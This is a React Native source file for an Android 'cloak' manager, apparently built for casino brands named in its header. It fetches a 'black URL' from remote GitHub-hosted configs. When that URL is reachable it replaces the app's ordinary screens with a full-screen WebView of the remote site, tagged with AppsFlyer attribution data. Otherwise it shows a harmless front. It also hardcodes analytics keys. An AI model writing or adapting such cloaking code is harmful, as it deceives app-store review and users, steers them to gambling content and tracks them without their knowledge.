/**
 * Master Android
 *
 * Android manager with analytics and cloak handling, can be used both pinup and spinit.
 *
 * @format
 */

import React, { useState, useEffect, useRef } from "react";
import {
  View,
  StyleSheet,
  ActivityIndicator,
  TouchableOpacity,
  Text,
  Image,
} from "react-native";
import appsFlyer from "react-native-appsflyer";
import { init, setUserId, track } from "@amplitude/analytics-react-native";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { WebView, WebViewNavigation } from "react-native-webview";
import { SafeAreaView } from "react-native-safe-area-context";
import RootNavigator from "./navigation/RootNavigator";

const TRACKING_APP_ID = "app25_android";
const ANDROID_APP_ID = "com.noir.casino";
const APPSFLYER_DEV_KEY = "hWREXZVUHPrfqnwyALbMD6";
const AMPLITUDE_API_KEY = "9ac8d5e5e524f920c0b2b35d256d12b9";

const CONFIG_RD_URL = "https://apps-cmyk.github.io/manager-config-rd/manager-config-rd.json";
const CONFIG_UP_URL = "https://pincode69.github.io/manager-config-up/manager-config-up.json";

const fetchBlackUrl = async (trackingAppId: string): Promise<string> => {
  try {
    const upResponse = await fetch(`${CONFIG_UP_URL}?t=${Date.now()}`, {
      headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
    });
    if (upResponse.ok) {
      const upConfig = await upResponse.json();
      const upUrl = (upConfig as Record<string, string>)[trackingAppId];
      if (upUrl) return upUrl;
    }
  } catch { }

  try {
    const rdResponse = await fetch(`${CONFIG_RD_URL}?t=${Date.now()}`, {
      headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
    });
    if (rdResponse.ok) {
      const rdConfig = await rdResponse.json();
      const rdUrl = (rdConfig as Record<string, string>)[trackingAppId];
      if (rdUrl) return rdUrl;
    }
  } catch { }

  return "";
};



export const MASTER_ANDROID = () => {
  const [clUrl, setClUrl] = useState<string | null>(null);
  const [showLoader, setShowLoader] = useState(false);
  const [showWebView, setShowWebView] = useState<boolean | null>(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [blackUrl, setBlackUrl] = useState<string | null>(null);

  const [canGoBack, setCanGoBack] = useState(false);
  const [canGoForward, setCanGoForward] = useState(false);
  const webViewRef = useRef<WebView>(null);
  const isFetchedRef = useRef<boolean>(false);
  const loadEndTimerRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    (async () => {
      const url = await fetchBlackUrl(TRACKING_APP_ID);

      if (!url) {
        await AsyncStorage.setItem("@cachedBlackUrl", "");
        await AsyncStorage.setItem("@showWebView", "false");
        setShowWebView(false);
        setIsInitialized(true);
        return;
      }

      setBlackUrl(url);

      const cachedUrl = await AsyncStorage.getItem("@cachedBlackUrl");
      const storedValue = await AsyncStorage.getItem("@showWebView");

      if (cachedUrl !== url) {
        await AsyncStorage.setItem("@cachedBlackUrl", url);
        await AsyncStorage.removeItem("@showWebView");
        setShowWebView(null);
        setShowLoader(true);
        setIsInitialized(true);
      } else if (storedValue !== null) {
        setShowWebView(storedValue === "true");
        setIsInitialized(true);
      } else {
        setShowLoader(true);
        setIsInitialized(true);
      }
    })();

    return () => {
      if (loadEndTimerRef.current) {
        clearTimeout(loadEndTimerRef.current);
      }
    };
  }, []);

  const buildLink = (appsflyerId: string, attributionData?: any): string => {
    if (attributionData) {
      const params: any = {
        devKey: APPSFLYER_DEV_KEY,
        appsflyer_id: appsflyerId,
        af_status: attributionData.af_status,
        campaign: attributionData.campaign,
        campaign_id: attributionData.campaign_id,
        ad_group: attributionData.adgroup,
        ad_group_id: attributionData.adgroup_id,
        media_source: attributionData.media_source,
        af_channel: attributionData.af_channel,
        af_adset: attributionData.af_adset,
        adset: attributionData.adset,
        adset_id: attributionData.adset_id,
        gclid: attributionData.gclid,
      };

      if (
        attributionData.campaign &&
        attributionData.campaign !== "" &&
        attributionData.campaign !== null &&
        attributionData.campaign !== undefined
      ) {
        const campaignParts = attributionData.campaign.split("_");
        if (campaignParts.length > 0) params.sub1 = campaignParts[0];
        if (campaignParts.length > 1) params.sub2 = campaignParts[1];
        if (campaignParts.length > 2) params.sub3 = campaignParts[2];
        if (campaignParts.length > 3) params.sub4 = campaignParts[3];
        if (campaignParts.length > 4) params.sub5 = campaignParts[4];
        if (campaignParts.length > 5) params.sub6 = campaignParts[5];
      }

      const query = Object.entries(params)
        .filter(
          ([_, value]) => value !== undefined && value !== null && value !== ""
        )
        .map(
          ([key, value]) =>
            `${encodeURIComponent(key)}=${encodeURIComponent(String(value))}`
        )
        .join("&");
      return `${blackUrl}?${query}`;
    } else {
      return (
        `${blackUrl}?` +
        `devKey=${encodeURIComponent(APPSFLYER_DEV_KEY)}` +
        `&app_id=${encodeURIComponent(ANDROID_APP_ID)}` +
        `&appsflyer_id=${encodeURIComponent(appsflyerId)}` +
        `&media_source=organic`
      );
    }
  };

  useEffect(() => {
    if (!blackUrl) return;

    (async () => {
      const appsflyerId = await new Promise<string>((resolve) => {
        appsFlyer.getAppsFlyerUID((err, uid) =>
          resolve(uid || "uid_not_found")
        );
      });

      await init(AMPLITUDE_API_KEY, undefined, {
        disableCookies: true,
      }).promise;
      setUserId(appsflyerId);
      track("app_open", { appId: TRACKING_APP_ID });

      appsFlyer.onInstallConversionData(async (res) => {
        if (res?.data) {
          track("af_attribution", { data: res.data, appId: TRACKING_APP_ID });
        } else {
          track("af_attribution_error", { appId: TRACKING_APP_ID });
        }

        const url = buildLink(appsflyerId, res?.data);
        setClUrl(url);
      });

      appsFlyer.initSdk(
        {
          devKey: APPSFLYER_DEV_KEY,
          appId: ANDROID_APP_ID,
        },
        async (result) => {
          const isFirstOpen = await AsyncStorage.getItem("@is_first_open");
          if (!isFirstOpen) {
            console.log("[MASTER_ANDROID] First open detected");
            appsFlyer.logEvent("first_open", { appId: TRACKING_APP_ID });
            await AsyncStorage.setItem("@is_first_open", "true");
          }
        },
        (error) => {
          console.error("[MASTER_ANDROID] AppsFlyer Init Error:", error);
        }
      );
    })();
  }, [blackUrl]);

  const handleGoBack = () => {
    if (webViewRef.current && canGoBack) {
      webViewRef.current.goBack();
    }
  };

  const handleGoForward = () => {
    if (webViewRef.current && canGoForward) {
      webViewRef.current.goForward();
    }
  };

  const handleNavigationStateChange = (navState: WebViewNavigation) => {
    setCanGoBack(navState.canGoBack);
    setCanGoForward(navState.canGoForward);
  };

  const makeDecision = async (
    statusCode: number | undefined | null,
    source: string,
    isNetworkError: boolean = false
  ) => {
    if (statusCode === 404 || isNetworkError) {
      await AsyncStorage.setItem("@showWebView", "false");
      setShowWebView(false);
      setShowLoader(false);
    } else {
      await AsyncStorage.setItem("@showWebView", "true");
      setShowWebView(true);
      setShowLoader(false);
    }
  };

  const handleLoadEnd = async (syntheticEvent: any) => {
    const { nativeEvent } = syntheticEvent;
    console.log("Load End:", nativeEvent);

    if (showWebView === null && !isFetchedRef.current) {
      loadEndTimerRef.current = setTimeout(async () => {
        if (!isFetchedRef.current) {
          isFetchedRef.current = true;
          await makeDecision(200, "handleLoadEnd");
        }
      }, 5000);
    }
  };

  const handleHttpError = async (syntheticEvent: any) => {
    const { nativeEvent } = syntheticEvent;
    console.log("Http Error:", nativeEvent);

    if (showWebView === null && !isFetchedRef.current) {
      if (loadEndTimerRef.current) {
        clearTimeout(loadEndTimerRef.current);
        loadEndTimerRef.current = null;
      }

      isFetchedRef.current = true;
      await makeDecision(nativeEvent.statusCode, "handleHttpError");
    }
  };

  const handleWebViewError = async (syntheticEvent: any) => {
    const { nativeEvent } = syntheticEvent;

    if (showWebView === null && !isFetchedRef.current) {
      if (loadEndTimerRef.current) {
        clearTimeout(loadEndTimerRef.current);
        loadEndTimerRef.current = null;
      }

      isFetchedRef.current = true;
      await makeDecision(undefined, "handleWebViewError", true);
    }
  };

  return (
    <View style={styles.mainContainer}>
      {isInitialized && showWebView === false && (
        <View style={[styles.layerContainer, styles.layerContent]}>
          <RootNavigator />
        </View>
      )}

      {isInitialized && clUrl && showWebView !== false && (
        <View style={[styles.layerContainer, styles.layerContent]}>
          <SafeAreaView style={styles.container}>
            <WebView
              key={`webview-${clUrl}`}
              ref={webViewRef}
              source={{ uri: clUrl }}
              style={styles.webview}
              allowsInlineMediaPlayback={true}
              mediaPlaybackRequiresUserAction={true}
              javaScriptEnabled={true}
              domStorageEnabled={true}
              scrollEnabled={true}
              onNavigationStateChange={handleNavigationStateChange}
              onLoadEnd={handleLoadEnd}
              onHttpError={handleHttpError}
              onError={handleWebViewError}
            />
            <WebViewHUD
              canGoBack={canGoBack}
              canGoForward={canGoForward}
              onGoBack={handleGoBack}
              onGoForward={handleGoForward}
            />
          </SafeAreaView>
        </View>
      )}

      {showLoader && <LoaderOverlay />}
    </View>
  );
};

const LoaderOverlay: React.FC = () => {
  return (
    <View style={[styles.layerContainer, styles.layerLoader]}>
      <SafeAreaView style={styles.loader}>
        <View style={styles.loaderIconWrapper}>
          <Image
            source={{ uri: "ic_launcher_bg" }}
            style={styles.loaderIconBg}
          />
          <Image
            source={{ uri: "ic_launcher" }}
            style={styles.loaderIconFg}
          />
        </View>
        <ActivityIndicator size="large" color="red" />
      </SafeAreaView>
    </View>
  );
};

interface WebViewHUDProps {
  canGoBack: boolean;
  canGoForward: boolean;
  onGoBack: () => void;
  onGoForward: () => void;
}

const WebViewHUD: React.FC<WebViewHUDProps> = ({
  canGoBack,
  canGoForward,
  onGoBack,
  onGoForward,
}) => {
  return (
    <View style={styles.hud}>
      <TouchableOpacity
        onPress={onGoBack}
        disabled={!canGoBack}
        style={canGoBack ? styles.hudButton : styles.hudButtonDisabled}
      >
        <Text style={styles.hudButtonText}>{"←"}</Text>
      </TouchableOpacity>
      <TouchableOpacity
        onPress={onGoForward}
        disabled={!canGoForward}
        style={canGoForward ? styles.hudButton : styles.hudButtonDisabled}
      >
        <Text style={styles.hudButtonText}>{"→"}</Text>
      </TouchableOpacity>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: "#000000",
  },
  webview: {
    flex: 1,
    backgroundColor: "#000000",
  },
  loader: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
    backgroundColor: "#000000",
  },
  hud: {
    flexDirection: "row",
    justifyContent: "center",
    alignItems: "center",
    backgroundColor: "#000000",
    paddingVertical: 10,
    gap: 50,
  },
  layerContainer: {
    position: "absolute",
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    width: "100%",
    height: "100%",
  },
  mainContainer: {
    flex: 1,
  },
  layerContent: {
    zIndex: 2,
  },
  layerLoader: {
    zIndex: 10,
    backgroundColor: "#000000",
  },
  loaderIconWrapper: {
    width: 150,
    height: 150,
    borderRadius: 12,
    overflow: "hidden",
    marginBottom: 48,
  },
  loaderIconBg: {
    width: 150,
    height: 150,
    position: "absolute",
    top: 0,
    left: 0,
  },
  loaderIconFg: {
    width: 225,
    height: 225,
    position: "absolute",
    top: -37,
    left: -37,
  },
  hudButton: {
    opacity: 1,
  },
  hudButtonDisabled: {
    opacity: 0.3,
  },
  hudButtonText: {
    color: "white",
    fontSize: 24,
  },
});
